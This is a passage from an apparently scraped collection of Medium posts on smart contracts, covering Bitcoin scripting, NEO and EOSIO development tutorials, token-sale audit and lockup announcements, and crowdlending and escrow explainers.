Version)\u00a0AppReferences[NEOTUTORIAL] NEO Project, NEO smart contract tutorial from http://docs.neo.org/en-us/sc/tutorial.html[NEONCOMPILER] NEO Project, Neon NEO MSIL Transcompiler from https://github.com/neo-project/neo-compiler.[NEOGUIDEVWALLET] NEO Project, hNeo-Gui-Developer Node/Wallet from hhttps://github.com/CityOfZion/neo-gui-developer.", "responses": ""}, {"title": "Bitcoin as a Smart Contract\u00a0Platform", "author_name": "TwoBitIdiot", "link": "https://medium.com/@twobitidiot/bitcoin-as-a-smart-contract-platform-ea5b39838b1a?source=search_post", "post_date": "Mar 30, 2015", "readtime": "12 min read", "upvotes": "1", "content": "Bitcoin as a Smart Contract\u00a0PlatformTwoBitIdiotBlockedUnblockFollowFollowingMar 30, 2015Just got back on the red eye from Lima, having survived the Inca Trail and Amazonian rainforest. I\u2019m back in action for the Bit tomorrow, but for today, one last guest post (really, syndication) from IBM\u2019s Richard Brown on Bitcoin as a smart contract platform. As usual, it\u2019s great stuff, and I hope I haven\u2019t spoiled you all with this excellent guest content from the past couple of weeks. Back to more humble idiocy starting tomorrow.Hasta ma\u00f1ana, amigos.BITCOIN AS A SMART CONTRACT PLATFORMby Richard Gendel Brown @gendalDistributed Ledger Platforms may be Getting All the Hype but the architecture of Bitcoin is more sophisticated than many people realiseI was a guest of the Financial Services Club Scotland last week. I presented an update on the world of cryptocurrencies to an engaged and well-informed audience in the library of the Royal College of Physicians.I reprised my current theme that the world of \u201cblockchains\u201d is really two distinct worlds\u200a\u2014\u200athe world of Ripple-like ledgers and the world of Bitcoin-like systems\u200a\u2014\u200athat happen to be united by a common architecture, the Replicated, Shared Ledger. This unifying concept is based on the idea that each participant has their own copy of the entire ledger\u200a\u2014\u200aand they trust the \u201csystem\u201d\u200a\u2014\u200awhatever system that is\u200a\u2014\u200ato ensure their copy is kept in sync with everybody else\u2019s. The differences are about what the ledger records and how it is secured.Bitcoin-like and Ripple-like systemsBroadly speaking, Ripple-like systems are focused on the representation of \u201coff-system\u201d assets and are secured by identifiable entities. Systems like Ripple, Hyperledger and Eris are broadly in this world, I think. The security model of these systems is based on knowing who the actors are: if somebody misbehaves, we can punish them because we know who they are!Bitcoin-like systems are more focused on \u201con-system\u201d assets and are secured by an anonymous pool of actors. Bitcoin and Ethereum are broadly in this space, I think. The security model here is based more on game-theoretic analyses of incentive structures: the goal is to make it overwhelmingly in the actors\u2019 financial interests to do the \u201cright\u201d thing.There is, of course, some ambiguity since all platforms have some notion of \u201csmart contracts\u201d\u200a\u2014\u200aor otherwise recording real-world agreements, as well as asset ownership. But this makes intuitive sense. If your platform is concerned with real-world assets and agreements then you necessarily need some concept of identity (who are the issuers?). And if you\u2019re reliant on the performance of real-world actors, why not also rely on them for the overall system security? Likewise, if the whole purpose of your platform is to create and manage a new asset that can be controlled/subverted by nobody, then giving identifiable entities the power to control your security would seem to defeat the point!Different design goals, different implementations. And the value of such systems to banks, corporations or individuals is, ultimately, an empirical question. I imagine 2015 will be the year where we discover many of the answers.Incrementalism versus \u201cDisruption\u201dBut I went further in my talk. I observed that these two worlds also differ in one other respect: the Bitcoin-like systems could be disruptive to existing institutions if they gained widespread adoption, whereas Ripple-like systems seem, to me, to be far more closely aligned to how things work today and are, perhaps, a source of incremental innovation.If this observation is correct, then firms looking at this space probably need to assess the technologies through different lenses. The question for banks for Ripple-like systems is: \u201chow could we use this to reduce cost or improve our operations\u201d whereas the question for Bitcoin-like systems is: \u201chow would we respond if this technology gained widespread adoption?\u201dAnd to answer the last question, one must be sure to really understand what the system under analysis really is!Bitcoin as a currency might be to miss the pointFor me, it is a mistake to think about Bitcoin solely as a currency. Because the Bitcoin currency system is a masterclass in mirage: underneath the hood, it\u2019s a fascinating smart contract platform.Or, as I said at the Financial Services Club, every time you make a Bitcoin payment, you\u2019re actually asking over 6000 computers around the world to run a small computer program for you\u2026 and your only task is to make sure that the computer program returns \u201cTRUE\u201d. Within the Bitcoin community, this is well-known, of course. Indeed, the work done by Mike Hearn and others to document the platform\u2019s capabilities has been around for years. But I find most people in the broader debate are unaware that the platform is pretty much built on this capability\u200a\u2014\u200ait\u2019s not an add-on.Bitcoin is a smart contract platformI wrote a piece last year offering an intuition for how Bitcoin works, in terms of land. My point was that the fundamental building block of the system is the \u201cunspent transaction output\u201d, or UTXO. The UTXO is what you get when somebody \u201cpays\u201d you some Bitcoin. The \u201coutput\u201d of their transaction is the money they paid to you. And whilst it sits in your \u201cwallet\u201d, it is, obviously, unspent. Hence \u201cunspent transaction output\u201d.So you can think of the current state of the Bitcoin system as being a huge pool of UTXOs: all the payments that have been received by Bitcoin users that they have not yet spent:Every payment that has not itself been spent is modeled in the Bitcoin system as an \u201cunspent transaction output\u201d. In general, each UTXO can only be spent by the owner of the \u201caddress\u201d to which it was sent (not always, and this is the point; see later). And each UTXO has an identifier (the transaction it appeared in and its position in the list of outputs of that transaction) and a value: how many Bitcoins are represented by that UTXO.But what people often miss is that these UTXOs are actually tiny little computer programs that live on the ledger, control access to bitcoins and run in response to specific incoming events. Smart Contracts, if you will. And the only way you get to spend the money controlled by that contract is if you can provide some input data that allows every node on the system to execute the program and check that it returns \u201cTRUE\u201dIf you can make the program return \u201cTRUE\u201d, you get to say what happens to the funds. If you can\u2019t, then you don\u2019t.So, when you want to spend your money, here\u2019s what you do:Your wallet software writes a little computer program for you and then sends it into the bitcoin network. It effectively says to the network: \u201cPlease run this little program I\u2019ve just given you. Then please find a program (\u201csmart contract\u201d?) on the platform with this ID for me. When you\u2019ve done that, feed the output from my program into program you just located\u201d. So this is a two step process: you provide your own little program\u2026 and the output of that is fed to the UTXO program that you want to spend.The way you spend money in Bitcoin is to ask the platform to run a small computer program that you provide and feed the output of that program to the \u201csmart contract\u201d that is storing the funds you want to spend. If you can make this second program run successfully, you get to spend the money. In Bitcoin terminology, the program you provide is \u201cscriptSig\u201d and the UTXO program is \u201cscriptPubKey\u201d. Your goal is to provide a \u201cscriptSig\u201d whose output can be fed into \u201cscriptPubKey\u201d to make it return \u201cTRUE\u201dSo what are these little programs? In the common case, they\u2019re really simple. The \u201cUTXO program\u201d simply says: \u201cprovide me with a digital signature that proves you own the key associated with the following Bitcoin address (and please also prove that you know the public key that corresponds to the bitcoin address)\u201d. That\u2019s why it\u2019s called the \u201cscriptPubKey\u201d.And the program you provide is just a way to ensure the bitcoin system sends this proof into the scriptPubKey program in the right way. It\u2019s a way of providing a digital signature. Hence it\u2019s called the \u201cscriptSig\u201dIf you don\u2019t know the private key then you can\u2019t generate the right signature and so you can\u2019t create the input necessary to get the smart contract (scriptPubKey) to run successfully and you don\u2019t get to spend the funds. So this, seemingly complex model, is just a way to ensure that the only person who can spend money at address 1abcde\u2026 is the person who knows the private key\u2026 exactly as we would want.Why is it this complex?But notice how powerful this is\u2026 because the other thing you do is tell the system to replace the existing scriptPubKey program with one or more new programs. And this is how your payment is modelled in the system. You pay somebody by creating a new program (a new scriptPubKey) that only they will be able to execute successfully. In this way, you can pay different people or send change back to yourself. The program that only you can run is replaced with ones that only the payees can run. And, in this way, the value has been passed from you to them.So the result is that the original program living on the ledger is replaced by one or more new programs. In the usual case, one or more of these new ones will be associated with somebody else\u2019s bitcoin address so only they will be able to control it. You have, in effect, paid them that money since the funds are now under their controlPaying somebody in Bitcoin is the same as replacing the program you control with ones they control. In this diagram, the funds you controlled have now been split between two new recipients. Only they can spend those funds.Smart Contracts?So what does this have to do with smart contracts? The key is that the model I outlined above is quite generic. The programming language is (just about) powerful enough to implement some interesting business logic that goes beyond \u201cRichard paying money to Bob\u201d. For example, you can write a program that will only return \u201cTRUE\u201d if you provide proof that you know the private key to multiple bitcoin addresses. This is a way to model \u201ca majority of Board Directors must jointly sign before these funds can be spent\u201d, perhaps. The Bitcoin \u201ccontracts\u201d wiki page goes into far more depth.However, the reality is that the capabilities of the platform are actually quite constrained\u200a\u2014\u200aand I think this explains a lot of the interest in other platforms, such as Ethereum. However, it should be noted that Gavin Andresen has argued that Bitcoin\u2019s limitations need not be a constraint.So what?Some might argue that it\u2019s not necessary to think about Bitcoin in this way. But I think that would be a mistake. Because, while lots of people are getting excited about the potential of smart contracts for business, we\u2019ve had a sophisticated smart contract platform running quite successfully for over half a decade, in the form of the Bitcoin network.Sure\u200a\u2014\u200ait\u2019s very limited (that\u2019s why systems like Ethereum are getting built). But it might be a mistake to bet that it won\u2019t evolve.Ultimately, my point is this: even if there\u2019s a low probability of success for a potentially disruptive system, it surely makes sense to understand everything possible about what that system can actually do\u2026[Disclosure\u200a\u2014\u200aI provide advice to Hyperledger in a personal capacity.]Events: \u201cBitcoin 2015\u201d is happening this fall. Stay tuned.Jobs, Jobs, JobsAbra, San Francisco (VC-Backed)The 2.0 remittance app that just won the Launch Festival last week is looking for two senior engineering hires. (goabra.com)-iOS Dev Lead\u200a\u2014\u200aMin 5 years development experience with at least 3 years on iPhone. Must understand location services, UI programming, and other core iOS servIces.-If you think you\u2019re a good match or know someone who is, email contact@goabra.com.Grayscale Investments, New York (a DCG Company)The manager of the Bitcoin Investment trust, the first publicly traded bitcoin investment vehicle, is making two non-engineering hires. (grayscale.co)-Account Manager\u200a\u2014\u200aMin 3 years of demonstrated sales-driven success within the financial industry, preferably in an investor development or capital raising role; Series 7 and 63 licenses certifications. More info here.-Marketing Manager\u200a\u2014\u200aMin 4 years of demonstrated success in product marketing, preferably in the financial space; looking for candidates with experience marketing either public or private investment products and/or marketing for asset management businesses. More info here.Bolt, San Francisco (VC-backed)The stealth startup focused on consumer applications of Bitcoin is making a number of engineering hires including Security Engineer, Ruby Engineer, and UI/UX Designer.-Check out Bolt (bolt.com) and email jobs@bolt.com.Elliptic, London (VC-backed)-The full-service bitcoin custodian is also making a number of key hires including data scientists and front-end developers.-Learn more and apply at elliptic.workable.comToday\u2019s Tid BitsInterest in Bitcoin Grows on Wall Streethttp://blogs.wsj.com/moneybeat/2015/03/29/interest-in-bitcoin-grows-on-wall-street/Corporate America has begun to make tentative bets on the blockchain-ledger technology behind Bitcoin, as it continues to explore innovative new enterprise uses for digital currencies. The idea is the the blockchain will cut out the intermediating middlemen allowing Wall Street to streamline some of its outdated services. Citigroup Inc., Nadsaq\u2019s OMX Group, USAA Bank, and the New York Stock Exchange have all recently been involved with Bitcoin. Not to mention, leadingfigures from Wall Street and Washington have been taking job offers in the digital-currency sector. Trading instruments are also now becoming more available, most notably, Barry Silbert\u2019sBitcoin Investment Trust, which opened for public trading this week.Bitcoin\u2019s \u2018First Felon\u2019 Charlie Shrem Begins 2-Year Sentencehttp://www.coindesk.com/bitcoins-first-felon-charlie-shrem-begins-2-year-sentence/Charlie Shrem, the 25-year-old bitcoin entrepreneur, begins his stint in prison today, having been sentenced in December to two years for aiding and abetting the operation of an unlicensed money transmitting business. Shrem hopes to only have to serve nine or ten months at the minimum-security facility. Shrem admitted violating anti-money laundering duties by dealing with Robert Faiella, who suppled $1m in bitcoin to people buying drugs on Silk Road. Shrem and Faiella both also agreed to forfeit $950,000 in plea bargains with the US government.Bitcoin Still Chugging Along in Chinahttp://www.pcworld.com/article/2903632/bitcoin-in-china-still-chugging-along-a-year-after-clampdown.htmlA year after China began to tighten regulations around Bitcoin, the digital currency is still being traded in high volumes, despite the declined price. Financial institutions in China are banned from dealing in bitcoins; however, the digital currency is still legal. Giving trading exchanges like BTC China enough room to operate, which leads the bitcoin market in trading volume. Bobby Lee, CEO of BTC China, believes, \u201cBitcoin is real and it\u2019s here to stay,\u201d although how the digital currency will evolve in China remains uncertain.Secret Service Agent: Digital Currencies Fueling Cybercrimehttp://www.coindesk.com/secret-service-digital-currencies-cybercrime/US Secret Service (USSS) agent Tate Jarrow suggested that without digital currencies, \u201ccybercrime would be much more difficult.\u201d At the OpRisk North American conference, Jarrow spoke out against bitcoin on the grounds that criminal activity it its most compelling use. In 2014, Jarrow was awarded the Secretary\u2019s Exceptional Service Award, which honors exceptional leadership that improves US homeland security.Caribbean Bitcoin Exchange Launches Following $1.5 Million Raisehttp://www.coindesk.com/caribbean-bitcoin-exchange-launches-following-1-5-million-raise/Bitt, a Caribbean digital currency exchange, has launched today having secured $1.5m in seed funding from local VC group Avatar Capital. The exchange is based in Barbados and is powered by AlphaPoint, an exchange technology platform provider thats also used by Bitfinex and Cointrader. Bitt also claims to have \u201cmilitary grade security,\u201d with a multi-signature HD wallet system keeping 95% of customers\u2019 bitcoin offline. The exchange will be able to trade in 11 major fiat currencies, including the US dollar, the pound and the euro.Bitcoin Embassy Amsterdam Founder Booted From Organization, Starts Second Embassyhttp://cointelegraph.com/news/113811/bitcoin-embassy-amsterdam-founder-booted-from-organization-starts-second-embassyMarek Skonieczny, one of the founders of the Bitcoin Embassy Amsterdam, has been suspended from the organization by his two former associates Martijn Wismeijer and Arthur Rommes for lack of financial accountability, his promotion of nonexistent events and undemocratic method of decision-making. After being banned from Amsterdam\u2019s original Bitcoin Embassy, Skonieczny began to plan to establish a new Bitcoin embassy right across the street.Have a tip or feedback? Email me! (2bitidiot@gmail.com)", "responses": ""}, {"title": "Smart Contract Nearly Finished, New AGA\u00a0Style", "author_name": "Gifto Official", "link": "https://medium.com/@gifto/smart-contract-nearly-finished-new-aga-style-ff90e58449b8?source=search_post", "post_date": "Mar 12", "readtime": "2 min read", "upvotes": "2", "content": "Smart Contract Nearly Finished, New AGA\u00a0StyleGifto OfficialBlockedUnblockFollowFollowingMar 12News Roundup- March 12th, 2018Smart Contract Progress!We\u2019ve made significant progress on our smart contract lockup for \u201cCompany Reserve\u201d A.K.A. \u201cTeam Tokens\u201d, and are nearly done! You\u2019ll have to wait a little longer for an official unveiling but we\u2019re looking forward to fulfilling this commitment and bringing a new level of transparency to our token supply management.Gifto\u2019s Smart Contract Lockup of \u201cCompany Reserve\u201d tokens ensures that the team is incentivized to take every opportunity to develop the Gifto project and become the world\u2019s leading mass blockchain application. Along with the smart contract the team has released an allocation schedule detailing how often we plan to release tokens from our \u201cPowering the Ecosystem\u201d reserve for the betterment of the project. Read the full details here.New AGA style was a hit! Watch now on\u00a0CoinUp!For last week\u2019s AGA we decided to have Adjansi, a longtime member of the Gifto community and tech expert join the livestream to talk directly with Nicholas Ray, GM of Gifto Beijing. We had a ton of fun and enjoyed being able to address community questions \u201cface-to-face\u201d while also being able to answer any questions that came up in the chat.We will be looking at ways to further iterate upon this style of AGA and may have another \u201cspecial guest\u201d in the future. For now, watch both parts of last week\u2019s AGA on CoinUp network\u00a0! (Part 1, Part 2)Follow Gifto Twitter, Facebook, or Telegram!", "responses": ""}, {"title": "Neo Smart Contract Development -Part\u00a04", "author_name": "Gaurav Agrawal", "link": "https://medium.com/coinmonks/neo-smart-contract-development-part-4-65036f923f1d?source=search_post", "post_date": "May 14, 2018", "readtime": "3 min read", "upvotes": "51", "content": "Neo Smart Contract Development -Part\u00a04Install NeoContractPlugin Visual Studio extensionGaurav AgrawalBlockedUnblockFollowFollowingMay 14, 2018Attribution\u200a\u2014\u200aThis series is republish work of Michael Herman (Toronto) from his Git Repository. All claps and Praise goes to him.PurposeThe purpose of this activity is to install the NeoContractPlugin extension into Visual Studio.Goals, Non-Goals and AssumptionsEnsure you have a working and properly configured version of Visual Studio 2017 configured with the NeoContractPlugin installed in Visual StudioPrinciplesProvide reliable documentation: timely, accurate, visual, and completeSave as much of a person\u2019s time as possibleUse open source software whenever possibleDriversNeed in the NEO\u00a0.NET developer community to have concise and easy-to-follow documentation to enable people to get up to speed developing NEO smart contracts in as short a time as possibleInstall NeoContractPlugin Visual Studio extensionStart Visual StudioFigure 4.1. Visual Studio Home\u00a0Screen2. On the Tools menu, select Extensions and Updates... to display the following page. Select Online; then enter NEO in the Search box. A list similar to the following will be displayed.Figure 4.2. Search for NeoContractPlugin extension3. To the right of the NeoContractPlugin extension, click Download.Figure 4.3. Download NeoContractPlugin extension4. The following message will be displayed in the status area at the bottom of the page. This indicates that Visual Studio has scheduled the installation to occur in the background after you exit Visual Studio. Click Closeon the page.Figure 4.4. NeoContractPlugin installation will be scheduled5. Click the Red X to close Visual Studio. In a minute or two, the following page will be displayed indicating that the installation of the extension has started. Click Modify.Figure 4.5. NeoContractPlugin extension install confirmation6. The installation of the extension will proceed.Figure 4.6. NeoContractPlugin extension installation progress7. When the installation of the extension is complete, the following page will be displayed.Figure 4.7. NeoContractPlugin extension installation completeTesting NeoContractPlugin Visual Studio extensionThe NeoContractPlugin extension cannot be tested in Visual Studio until the NEO C# transcompiler has been build and configured. This is described in the next activity. The NeoContractPlugin Visual Studio extension will be tested near the end of that activity.The tasks for this activity are complete. Proceed to Activity 5\u200a\u2014\u200aBuild and test NEO developer tool projects (from source).References[NEOCONTRACTPLUGIN] NEO Project, NEO Development Pack from https://github.com/neo-project/neo-devpack-dotnet", "responses": ""}, {"title": "ETHLend Token Sale Smart Contract Passed the Security Audit\u200a\u2014\u200aReady for Deployment", "author_name": "Aavesome", "link": "https://medium.com/aave/ethlend-token-sale-smart-contract-passed-the-security-audit-ready-for-deployment-ed7a0cb0824b?source=search_post", "post_date": "Sep 15, 2017", "readtime": "2 min read", "upvotes": "", "content": "ETHLend Token Sale Smart Contract Passed the Security Audit\u200a\u2014\u200aReady for DeploymentAavesomeBlockedUnblockFollowFollowingSep 15, 2017A third party security audit on the token sale smart contract has been conducted.The security audit revealed one potential security issue, which does not affect the token sale itself, but rather the future use of the token. The Flaw has been fixed during the audit review process.Due to the simplicity of the token sale smart contract, the smart contract did not consist of zeppelin-solidity, a commonly used library, which was recommended for functionality. Audit suggested not to reinvent the wheel and use the aforementioned library instead. Additionally, the audit suggested to avoid human error by hard coding the parameters in to the smart contract. Without such hard coding, extra attention should be maintained during the deployment of the smart contract to the main-net.Overall, the auditor stated:\u201cAll these issues did not affect the security of the ICO contract directly\u201d and \u201cThe ICO contract is safe for use in production\u201d.As the security audit has taken place and no security issues are holding the token sale, we are comfortable to proceed in deploying the contract to the Kovan test-net and later on Ethereum main-net. More details and instructions on how to participate on the pre-sale on 25 September are published during the ongoing week.More details about the security audit:https://github.com/ETHLend/ICO_SmartContract/blob/master/ETHLend%20Token%20Sale%20Smart%20Contract%20Security%20Audit%20Report.pdf", "responses": ""}, {"title": "How To Fund Your Next Business With A Crowdlending Smart\u00a0Contract", "author_name": "ELIX", "link": "https://medium.com/@getelix/how-to-fund-your-next-business-with-a-crowdlending-smart-contract-e4a7ce662cd2?source=search_post", "post_date": "Oct 27, 2018", "readtime": "5 min read", "upvotes": "1", "content": "How To Fund Your Next Business With A Crowdlending Smart\u00a0ContractELIXBlockedUnblockFollowFollowingOct 27, 2018Over the past few years, blockchain has caught the attention of mainstream media. In late 2017, an explosion of interest in digital currencies led to a massive influx of new projects and capital. Cryptocurrencies have grown rapidly in value over the past few years. From October 2013 to October 2018, the total market cap of digital currencies grew from approximately 2 to over 200 billion dollars.The Rise Of Smart ContractsSmart contracts are elegant, decentralized ways of exchanging and managing information. Programmers use smart contracts to write decentralized protocols for finance, supply chain applications, and gaming.Smart contracts were first introduced with the release of Ethereum by Vitalik Buterin, Gavin Wood and Joseph Lubin and other members of the Ethereum core team. The idea for Ethereum was originally proposed by Vitalik Buterin in late 2013. Prior to Ethereum, there was no versatile blockchain scripting language meant for DApps. A DApp is an decentralized application where code is executed on P2P networks rather than on central servers. Ethereum smart contracts are written in the scripting language Solidity, which runs on the Ethereum Virtual Machine. The original Ethereum Yellowpaper containing an overview of all initial functionality with technical details was authored by British programmer Gavin Wood.Creating Your First Smart\u00a0ContractTo learn how smart contracts could help jumpstart your business, it\u2019s important to understand how they work.Solidity is a programming language designed for writing Ethereum contracts. These smart contracts are commonly used to create digital Ethereum tokens, decentralized tokens that have a limited supply. Below, we\u2019ll briefly describe common practices for creating tokens for both fungible and non-fungible use cases.\u201cERC-20\u201d smart contracts are an early token standard proposed by the Ethereum community. ERC stands for \u201cEthereum Request for Comment\u201d and is meant as a way to solicit community and develop ideas. ERC-20 asks developers to specify a variety of token attributes like token supply, name, decimals, as well as include a set of common functionalities like transfers and balances. An ERC token contract with a specific supply is relatively easy for any programmer to deploy. The browser Solidity IDE Remix is a great way to get started and compile your first Solidity code. Here\u2019s one sample fragment from an ERC-20 smart contract:In contrast, ERC-721 is a standard requested for non-fungible tokens like collectibles. For decentralized games, these non-fungible tokens can represent tradable items where the uniqueness of each item is important. For ERC-721 tokens, the code looks slightly different. Instead of transferring a certain amount of tokens, the transfer function moves a token based upon a unique token identifier. It\u2019s important to remember that since the Ethereum Project itself is not a corporation (but instead an open source project), these token requests are proposals made by community members and sometimes there is room for improvement. For example, ERC-20 smart contracts could have benefitted from a fallback function that prevents token smart contracts from burning Ether or tokens sent to them. Updates like this are being proposed for newer token standards. Although extremely promising, decentralization still requires an attentive and involved community dedicated to making continuous improvements.So, what would a basic crowdlending smart contract look like for your business? For crowdlending, you could use a token standard like ERC-20 to get started. You\u2019d need to write and sign additional contracts (which could also be executed on the blockchain) legally obligating you to distribute some amount of profits from your business to token holders. Legal agreements are often signed nowadays by hand, but there\u2019s no reason they couldn\u2019t provide a more secure digital signature recorded on a blockchain.Benefits For EntrepreneursWe recently released an article on the ELIX blog about how blockchain will democratize fundraising for entrepreneurs and investors. Opening equity crowdfunding via blockchain to investors globally should allow entrepreneurs to get much more competitive rates when creating a business. Moreover, it\u2019s a great way to gauge interest and build a community of people vying for your business to succeed. Instead of relying on only a few investors in your network and the deals they offer, you can grow your brand and business presence even before your first product is launched.Legal ConsiderationsThe regulations around STOs, or Security Token Offerings, are complex and vary from country to country. These offerings are sometimes more complicated than the distribution of utility tokens. Be sure to have an experienced legal team to help you navigate the local laws in your jurisdiction when doing an STO. This is article is not financial advice, and you should always do your own research. Since blockchain is a new frontier, hiring lawyers that specialize in the space will help you make sure all legal counsel is relevant to your specific goal.Profit Sharing Via Smart ContractsSmart contracts would be an excellent way to distribute profits from a company. The rules for distribution (the entitlement of the shareholders to dividends) would be clearly stated in the contract code. As long as each business posted profits in a contract in the form of digital security tokens, the rules for how many each investor could receive would be completely transparent. Even the \u201cClass\u201d or specific privileges of each tier of tokenized stock could be recorded on the blockchain for further clarity. Board voting and major company decisions would also be transparent and publicly visible. Surprisingly, this might require some blockchain lawyers to learn basic smart contract coding.That\u2019s all for this post! If you\u2019re interested in reading more articles about blockchain, crowdfunding and technology trends, check out more of our Medium blog posts.", "responses": ""}, {"title": "7 Steps to Get Started with EOSIO Smart Contract Development", "author_name": "Gabo Esquivel", "link": "https://medium.com/eos-costa-rica/7-tips-to-learn-eosio-smart-contract-development-dc843a5f1d3?source=search_post", "post_date": "Jan 27", "readtime": "2 min read", "upvotes": "1", "content": "7 Steps to Get Started with EOSIO Smart Contract DevelopmentGabo EsquivelBlockedUnblockFollowFollowingJan 27I\u2019ve worked on software development for 10 years now, mainly on JavaScript applications: nodejs and single page apps. On 2017, I decided to focus the rest of professional career on blockchain technology, smart contracts and decentralized applications; I co-founded BlockchainCR, a community hub for knowledge sharing, promoting and studying blockchain technologies in Costa Rica, and in 2018 I joined EOS Costa Rica, an EOSIO block producer and software development company.I currently work configuring EOSIO nodes for public and private blockchains and writing smart contracts. The path to learn wasn\u2019t that easy, to be honest. Specially because I hadn\u2019t touched c++ since my university days.Here\u2019s a short list of seven steps that might serve you as guide if you are starting to develop smart contracts for EOSIO blockchains:Learn the basics: blockchain and its use cases. https://learn.eoscostarica.io/Learn EOSIO history, purpose and its consensus algorithm (dpos)Learn about the different EOSIO components: nodeos, cleos, keosd, cdt.Learn cpp: the general concepts and syntax.Learn the smart contract api.\u00a0https://eosio.github.io/eosio.cdt/1.5.0/Read other people\u2019s smart contracts.\u00a0https://github.com/eoscostarica/eos-contractsWrite your own contracts, that\u2019s only way actually learn anything!\u00a0It\u2019s good follow a design have process.\u00a0https://github.com/digital-scarcity/equiprentalBe patient, you are going need time to start flowing.Additionally, join the developer telegram groups and stack exchange:EOS Developers in telegram https://t.me/joinchat/Esi1OkPktgcFeJ3LmlcrqgEOSIO Stack Exchange https://eosio.stackexchange.com/", "responses": ""}, {"title": "Getting started with Smart Contract Development", "author_name": "Vamshi Vangapally", "link": "https://medium.com/@vvkr/getting-started-with-smart-contract-development-89ed50f15ecb?source=search_post", "post_date": "Jan 14", "readtime": "", "upvotes": "1", "content": "Getting started with Smart Contract DevelopmentVamshi VangapallyBlockedUnblockFollowFollowingJan 14Whether you want to build the next decentralized e-sports platform or write a simple smartcontract or write a crowdsale contract to raise funds through ICO\u200a\u2014\u200ayou can do these using Ethereum Platform.As we all know Ethereum is a platform for building decentralized apps which run on fuel called Ether(gas). Also a minimal complete entity you can write on Ethereum is a smart-contract\u200a\u2014\u200awhich basically provides you with few functions and you get to do a transaction.To start with developing either smart-contracts or DApps\u200a\u2014\u200awe need to have a development environment.Solidity is the programming language in which smart-contracts are coded.NPM (Node Package Manager) can be used to fetch required packages/modules for executing few tasksTruffle is a development environment, testing framework and asset pipeline for Ethereum.OpenZeppelin is a framework to build secure smart contracts on Ethereum. Provides templates with best practices incorporated.So, you\u2019ll be able to build smart-contract using Truffle, compile it and migrate it by following lots of articles available like this, this and this.Once you\u2019re done, you need to Test it.", "responses": ""}, {"title": "", "author_name": "Michael Haupt", "link": "https://medium.com/@michaelhaupt/yes-a-smart-contract-is-much-more-enforceable-than-the-scene-you-have-described-c6089d47493b?source=search_post", "post_date": "Jun 18, 2017", "readtime": "", "upvotes": "2", "content": "Michael HauptBlockedUnblockFollowFollowingJun 18, 2017Yes, a smart contract is much more enforceable than the scene you have described. Will I be providing a definition of smart contract? No. The reason why is important.When the book is published, it will be marketed to millennials (and it will always remain available online at no cost to anyone).In all my discussions with millennials recently, the most repeated thing I\u2019ve heard is that they don\u2019t want to be told anything\u200a\u2014\u200athey want to discover stuff for themselves. Part of what I\u2019m trying to do with the book is help millennials discover tech and societal developments that already exist that help them break out of the mindset imposed on them during their school and college years. The Big Questions at the end of every postcard helps them do this.What I will be adding (which was missing in the first versions of these postcards) is an Ask Google link to a search query for each question. Since it wasn\u2019t there when you first read about smart contracts, here\u2019s where you can Ask Google what a smart contract is (also added to the original article).From my discussions with millennials, there is far more value in posing the right question than posting a definition.", "responses": "1"}, {"title": "What is blockchain smart contract and how smart contract\u00a0works?", "author_name": "Laxmicoin", "link": "https://medium.com/@laxmicoin/what-is-blockchain-smart-contract-and-how-smart-contract-works-fceefc72be1f?source=search_post", "post_date": "Sep 20, 2018", "readtime": "4 min read", "upvotes": "2", "content": "What is blockchain smart contract and how smart contract\u00a0works?LaxmicoinBlockedUnblockFollowFollowingSep 20, 2018The first thing to know about blockchain smart contract is that they are not any physical contract(i.e it is not written on paper).So, now you would think what basically it is?Once you go through this post you will easily understand about smart contracts.History of smart contractsThe principle of \u201csmart contract\u201d was created in 1996 by American cryptographer and computer scientist Nick Szabo. Nick Szabo is an important figure in the history of blockchains as the inventor of Bit Gold. Nick Szabo back in 1996 itself introduced \u2018Smart Contracts\u2019, long before the appearance of blockchain technology. According to Nick\u2019s theory, smart contracts are digital protocols for information transfer that use some mathematical algorithms to automatically execute a transaction once the established conditions are met and that controls the whole process.What is smart contract?\u201cSmart contracts are lines of code that are stored on a blockchain and automatically execute when predetermined terms and conditions are met.\u201dSmart contracts help you exchange money, property, shares, or anything of value in a transparent, conflict-free way while avoiding the services of a middleman.How smart contracts work?Let\u2019s explain smart contract through a simple example.Let\u2019s say Boby owns a construction company and Cooper and Drake work for Boby. Andrea is looking to build a boutique and she wants to make payment in cryptocurrency. Boby\u2019s construction company is ready to take payment in crypto. So, Andrea goes to Boby and asks Boby, will he build a boutique for her?Boby replies \u201cyes I can build a boutique for you, but I have a condition. If we fail to build the boutique, you will be refunded only a part of your payment.\u201d(I.e I and Cooper must be paid, but Drake should only be paid if the boutique is successfully build)Andrea replies, that she is agrees to this condition. Now, she will make a smart contract mentioning all the terms and conditions and get back to them soon.So, now what should Andrea suppose to do?So, Andrea choose a platform, i.e a blockchain technology.Here we are using \u201cRover blockchain\u201d for the smart contract purpose.And we already know what is the solution of our problem and we are also aware of the condition which has been mentioned by Boby. Let me simplify the conditions. So our condition is:IF BOUTIQUE BUILD then pay to Boby, Cooper and DrakeELSE pay Boby and Cooper.Now we move forward and make a smart contract. Here is a setup of our contract.Andrea creates a escrow account, E with her 18 Laxmicoins and sets all thresholds to 1.Escrow Account E:Balance: 18 LaxmicoinsSequence #: 1Low threshold: 1Medium threshold: 1High threshold: 1Boby constructs two transactions, just like Andrea did but this time Boby will set the sequence number as sequence number = sequence number + 2TX 1:Sequence #3Pay Boby 6 Laxmicoinspay Cooper 6 LaxmicoinsPay Drake 6 LaxmicoinsTX 2:Sequence #3Pay Boby 6 Laxmicoinspay Cooper 6 LaxmicoinsAndrea will construct a third transaction with the hashes of the transactions given to her by Boby:TX SETUP:Sequence #2Master Key weight: 0Add TX 1 HASH as a signer w/ weight: 1Add TX 2 HASH as a signer w/ weight: 1Andrea signs TX SETUP with Master Key of Escrow account E and submits it to the network.Here we are just making an escrow account E, where we locking 18 Laxmicoins. Now, Andrea has no right to access her fund. Since Andrea cannot access Account E. Tx1 and Tx2 both are valid until one of them is spent. Here Boby constructed both transactions and only send hashes to Andrea and only Boby has power to submit the final transaction.But, here comes the biggest question whom should we trust?Boby is someone who is trusted by all the parties engaged and therefore the answer here is to believe Boby for making the final judgement and we consider that his judgement will be correct and genuine.Advantages of smart contractSpeed\u200a\u2014\u200aProcessing documents by any individual takes a lot of time and objectives are delayed due to it. Smart contracts are self executing programs due to which we can save our valuable time.Independence\u200a\u2014\u200aSmart contracts are not dependent on any third party for the process to be followed.Reliability\u200a\u2014\u200aData entered in the blockchain cannot be altered or destroyed. They are immutable.Accuracy\u200a\u2014\u200aThe automated system for executing transactions and the removal of human factors ensures high accuracy when executing smart 